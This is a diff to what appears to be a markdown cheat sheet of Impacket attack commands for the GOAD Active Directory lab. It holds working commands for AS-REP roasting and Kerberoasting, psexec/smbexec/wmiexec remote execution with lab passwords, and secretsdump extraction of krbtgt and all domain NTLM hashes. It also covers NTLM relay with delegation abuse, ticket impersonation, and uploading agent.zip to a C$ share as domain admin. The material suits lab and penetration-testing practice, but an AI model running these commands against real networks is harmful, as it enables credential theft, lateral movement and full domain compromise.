@@ -36,14 +36,25 @@ ldapsearch -x -H ldap://192.168.56.11 -s base '' currentTime
 
 ## Impacket
 
+Never embed `$` / `!` passwords inside `ssh … bash -c "…"`. Write a script
+with a quoted heredoc (`<<'EOF'`) and run that file — `$@` and `\!` will
+mangle the cred otherwise.
+
 ```bash
+# upload as DA (impacket 0.14 dropped -windows-auth; NTLM is the default)
+printf 'lcd /home/kali/Ad\nuse C$\nput agent.zip\nexit\n' \
+  | impacket-smbclient 'SEVENKINGDOMS/lord.varys:PASS@192.168.56.10'
+
 impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -dc-ip 192.168.56.11 -usersfile /logs/users.txt
 impacket-GetUserSPNs north.sevenkingdoms.local/hodor:hodor -dc-ip 192.168.56.11 -request
 impacket-getTGT north.sevenkingdoms.local/jon.snow:iknownothing -dc-ip 192.168.56.11
 impacket-psexec north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@192.168.56.22
 impacket-smbexec north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@192.168.56.22
 impacket-wmiexec north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@192.168.56.22
-impacket-secretsdump -just-dc-user krbtgt north.sevenkingdoms.local/DA:'PASS'@192.168.56.11
+# multi-domain GOAD: krbtgt is NOT unique — prefix NetBIOS
+impacket-secretsdump -just-dc-user SEVENKINGDOMS/krbtgt \
+  'sevenkingdoms.local/DA:PASS'@192.168.56.10 -just-dc-ntlm
+impacket-secretsdump -just-dc-ntlm 'sevenkingdoms.local/DA:PASS'@192.168.56.10
 impacket-ntlmrelayx -t ldaps://192.168.56.11 -smb2support --delegate-access
 impacket-getST -spn cifs/winterfell.north.sevenkingdoms.local \
   -impersonate administrator -dc-ip 192.168.56.11 \
